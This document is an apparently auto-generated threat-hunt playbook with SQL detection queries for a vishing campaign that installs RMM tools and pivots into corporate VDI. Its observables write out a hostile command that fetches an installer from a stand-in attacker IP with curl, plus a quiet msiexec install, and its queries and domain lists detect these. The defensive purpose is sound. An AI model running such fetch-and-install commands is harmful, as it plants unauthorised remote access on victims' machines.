---
analysis: A simple rule could alert on 'SuperOps.msi', but this hunt pivots across
  four surfaces (Software Inventory, Process, DNS, and Authentication) to verify if
  a tool is being used specifically as a bridge to corporate VDI, differentiating
  actor behavior from authorized IT usage via prevalence baselines.
blind_spots:
- id: missing-endpoint-telemetry
  question: Was the RMM tool installed on a host that is not reporting activity?
  requires: endpoint agent (osquery/EDR) coverage on all hosts
  risk: An unmanaged or non-reporting host could serve as the beachhead for the VDI
    pivot without being detected by process or software inventory queries.
  stage: execution-rmm-abuse
- id: vishing-blind-spot
  question: Can we see the initial vishing phone call to the victim?
  requires: SIP/Voice call logs or call center telemetry
  risk: The hunt only sees the technical aftermath. We cannot verify the 'IT helpdesk'
    impersonation directly from these logs.
  stage: initial-access-vishing-pretext
- id: unmanaged-byod-source
  question: Can we see the activity on the personal device used to bridge into VDI?
  requires: Presence of an agent on personal BYOD devices
  risk: The 'personal laptop' used as the source for Citrix/Windows 365 is outside
    our visibility, leaving only the VDI session itself for inspection.
  stage: lateral-movement-vdi-pivot
coverage:
- blind_spot: vishing-blind-spot
  reason: Vishing and initial consumer email lures leave no trace in the provided
    endpoint, network, or auth surfaces; no SIP or email gateway sources are listed.
  stage: initial-access-vishing-pretext
  status: not_visible
- stage: execution-rmm-abuse
  status: covered
  steps:
  - superops-installation-behavior
  - dns-to-actor-infrastructure
  - rare-rmm-prevalence
- stage: lateral-movement-vdi-pivot
  status: covered
  steps:
  - vdi-signins-from-unusual-ips
  - identify-vdi-rmm-footprint
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: discovery-document-harvesting
  status: out_of_scope
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: exfiltration-cloud-ftp
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: keep-as-periodic-hunt
  justification: UNC3753 targeting US law firms for data extortion represents a high-risk
    scenario; identifying the bridge between unmanaged endpoints and corporate VDI
    is critical to preventing data theft.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder has gained initial access via vishing, establishing a beachhead
  with an unauthorized RMM tool (like SuperOps or AnyDesk) on a host that then pivots
  into corporate VDI environments.
labels:
- hunt
- attack.t1566
- attack.t1133
- attack.t1090.003
- attack.t1021.001
name: UNC3753 Vishing to VDI Bridge
parameters:
  actor_domains:
    default:
    - privnote.com
    - lockbit.black
    description: Domains associated with UNC3753 infrastructure.
    from:
      kind: article
      observed: '2026-05-01'
      ref: UNC3753 targeted campaign
    type: list[domain]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  rmm_names:
    default:
    - anydesk.exe
    - bomgar.exe
    - zoho.exe
    - assist.exe
    - superops.exe
    description: Executable names of RMM tools commonly abused by this cluster.
    from:
      kind: article
      observed: '2026-05-01'
      ref: UNC3753 targeted campaign
    type: list[string]
  scope_hosts:
    default: []
    description: Hosts to limit the hunt to, identified in the scoping step.
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
    gates:
    - dry-run
    - lint
    - critic
    model: hb_google/gemini-3-flash-preview
rationale: Focus on high-value roles likely to be targeted (legal, financial), and
  prioritize hosts with VDI clients installed as identified in the first step.
references:
- name: "Mandiant \u2014 UNC3753 targeted campaign against US law firms"
  url: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
related:
- hunt: unc3753-document-harvesting-exfiltration
  reason: This hunt focuses on the entry and bridge; the follow-on hunt focuses on
    the harvesting within iManage and exfiltration.
  relation: follows
scenario:
  stages:
  - name: Vishing and Helpdesk Impersonation
    observables:
    - Invoice-themed emails from consumer accounts
    - Phone calls posing as IT support/security
    - Instructions to join screen-sharing sessions
    slug: initial-access-vishing-pretext
    tactic: initial-access
    techniques:
    - T1566
  - name: Abuse of RMM and Screen-Sharing Tools
    observables:
    - privnote.com
    - SuperOps.msi
    - curl -sL http://[actor-controlled-ip]/installer
    - msiexec /i SuperOps.msi /quiet
    - AnyDesk
    - Bomgar
    - Zoho Assist
    - Quick Assist
    slug: execution-rmm-abuse
    tactic: execution
    techniques:
    - T1133
    - T1090.003
  - name: BYOD to VDI Environment Pivot
    observables:
    - Windows365.exe
    - Citrix clients
    - Logins from personal BYOD source IPs
    slug: lateral-movement-vdi-pivot
    tactic: lateral-movement
    techniques:
    - T1021.001
  - name: Document Staging and Keyword Discovery
    observables:
    - iManage keyword searches
    - Searching for W-2, W-9, 1099, SSN
    - Staging files in Downloads folder
    - Staging files in Roaming profile path
    slug: discovery-document-harvesting
    tactic: discovery
  - name: Exfiltration via WinSCP and Cloud Storage
    observables:
    - WinSCP.exe
    - rclone.exe
    - Drag-and-drop to consumer Google Drive
    - Email forwarding to actor email addresses
    - Exfiltration within 30 minutes of entry
    slug: exfiltration-cloud-ftp
    tactic: exfiltration
    techniques:
    - T1041
    - T1567.002
  summary: UNC3753 conducts fast-tempo data theft extortion campaigns against law
    firms by using vishing and social engineering to trick employees into installing
    RMM tools. Once access is established, the actors pivot through VDI environments
    to harvest sensitive legal and financial documents for exfiltration via FTP utilities
    or cloud storage.
series:
  index: 1
  slug: unc3753-targeted-campaign-against-us-law-firms
  title: UNC3753 targeted campaign against US law firms
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  identity:
    category: identity
    name: Identity / sign-in telemetry
    telemetry:
    - identity
tlp: clear
type: investigation
---


# UNC3753 Vishing to VDI Bridge

This hunt targets the 'UNC3753' (Luna Moth) lifecycle, specifically the transition from initial social engineering to technical persistence. We search for the specific use of cURL to install SuperOps RMM, identify the presence of 'privnote' in DNS logs (used for payload delivery), and look for unusual VDI client activity or sign-ins that suggest a pivot from an unmanaged BYOD endpoint. The hunt is scoped to hosts possessing VDI or known RMM software and uses prevalence counting to identify rare, actor-directed tools.

## identify-vdi-rmm-footprint
<!-- Inventory hosts with VDI or RMM software -->
Scope the hunt to hosts that possess the software known to be used in the campaign (Citrix, Windows 365, or the RMM tools).

```sqlite target=endpoint role=scoping
~~~yaml
expected: A list of hosts running VDI or RMM clients. Silence suggests a lack of these
  tools in the managed inventory.
reads:
- device_hostname
- package_name
- package_version
- vendor_name
- install_path
- asset_scope
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, package_name, package_version, vendor_name, install_path FROM hb_software_inventory WHERE (LOWER(package_name) LIKE '%citrix%' OR LOWER(package_name) LIKE '%windows 365%' OR LOWER(package_name) LIKE '%anydesk%' OR LOWER(package_name) LIKE '%superops%') AND asset_scope = 'endpoint'
```

## superops-installation-behavior
<!-- cURL installation of SuperOps RMM -->
Detect the specific command-line pattern observed where cURL fetches an MSI and msiexec installs it quietly, filtered to the VDI/RMM scope.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: Direct evidence of the reported installation pattern. One hit is highly
  significant.
reads:
- device_hostname
- process_name
- process_cmd_line
- user_name
- time
silence: evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, process_name, process_cmd_line, user_name, time FROM hb_process_activity WHERE ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND ((LOWER(process_cmd_line) LIKE '%curl%installer%' AND LOWER(process_cmd_line) LIKE '%superops.msi%') OR (LOWER(process_name) LIKE '%msiexec.exe' AND LOWER(process_cmd_line) LIKE '%/i%superops.msi% /quiet%')) AND time >= datetime('now', '-{{lookback_days}} days')
```

## corroborate-activity
<!-- Corroborate with DNS and VDI Sign-ins -->
parallel:
- → dns-to-actor-infrastructure
- → rare-rmm-prevalence
- → vdi-signins-from-unusual-ips
join: → triage-unc3753

## dns-to-actor-infrastructure
<!-- DNS lookups for actor delivery domains -->
Find lookups to privnote.com, which is used to pass links to victims during vishing sessions.

```sqlite target=endpoint role=enrichment params=(lookback_days=lookback_days, actor_domains=actor_domains, scope_hosts=scope_hosts)
~~~yaml
expected: A host resolving privnote.com shortly before RMM tools are installed.
reads:
- device_hostname
- query_hostname
- process_name
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT device_hostname, query_hostname, process_name, COUNT(*) as lookup_count FROM hb_dns_activity WHERE ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND instr(',' || '{{actor_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0 AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY 1, 2, 3
```

## rare-rmm-prevalence
<!-- Rare RMM execution prevalence -->
Identify RMM tools (AnyDesk, Bomgar, Zoho) that are rare across the fleet, suggesting shadow IT or actor-directed usage.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days, rmm_names=rmm_names, scope_hosts=scope_hosts)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: RMM binaries running on only a handful of hosts.
prevalence:
  by: device_hostname
  key:
  - process
  rare_below: 3
reads:
- process_name
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT LOWER(process_name) as process, COUNT(DISTINCT device_hostname) as host_count, MIN(time) as first_seen FROM hb_process_activity WHERE ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND instr(',' || '{{rmm_names}}' || ',', ',' || LOWER(process_name) || ',') > 0 AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY 1 HAVING host_count <= 3
```

## vdi-signins-from-unusual-ips
<!-- VDI sign-ins from external sources -->
Identify logins to Citrix or Windows 365, which might be the destination of the BYOD bridge.

```sqlite target=identity role=triage params=(lookback_days=lookback_days)
~~~yaml
expected: Sign-ins to corporate VDI infrastructure. Silence here might mean the actor
  hasn't successfully pivoted yet.
reads:
- actor_user_name
- src_endpoint_ip
- dst_endpoint_name
- time
- status_id
silence: not_evidence_of_absence
source: hb_auth_signin
verified: dry-run
verified_at: '2026-09-17'
~~~
SELECT actor_user_name, src_endpoint_ip, dst_endpoint_name, time FROM hb_auth_signin WHERE (LOWER(dst_endpoint_name) LIKE '%citrix%' OR LOWER(dst_endpoint_name) LIKE '%windows365%') AND status_id = 1 AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-unc3753
<!-- Evaluate UNC3753 activity chain -->
```agent target=hunter
cite: required
context:
- superops-installation-behavior
- dns-to-actor-infrastructure
- rare-rmm-prevalence
- vdi-signins-from-unusual-ips
max_iterations: 6
objective: Review the identified RMM installation behavior, DNS queries to privnote.com,
  and VDI sign-ins to determine if a host has been compromised by UNC3753 via vishing.
success_criteria: A verdict of malicious | suspicious | benign citing specific process
  paths, domains, and usernames.
tools:
- endpoint
- identity
```

## decide-on-verdict
<!-- Route on triage verdict -->
if~: "the triage verdict is malicious for at least one host based on the SuperOps installer or privnote DNS match" (confidence: high, judge=hunter)
then: → isolate-compromised-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: missing-endpoint-telemetry)
else: → close-out

## isolate-compromised-host
<!-- Isolate compromised host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host and revoke any active Citrix/Windows 365 sessions for the affected user.
```
→ analyst-review

## analyst-review
<!-- Analyst review -->
```manual target=analyst
Review the triage results, verify the VDI source IP, and investigate for any staging (e.g. large file copies in Roaming/Downloads) that may have occurred.
```
→ end

## close-out
<!-- Close out -->
```manual target=analyst
No significant UNC3753 activity detected. Ensure RMM prevalence is monitored for new entries.
```
→ end
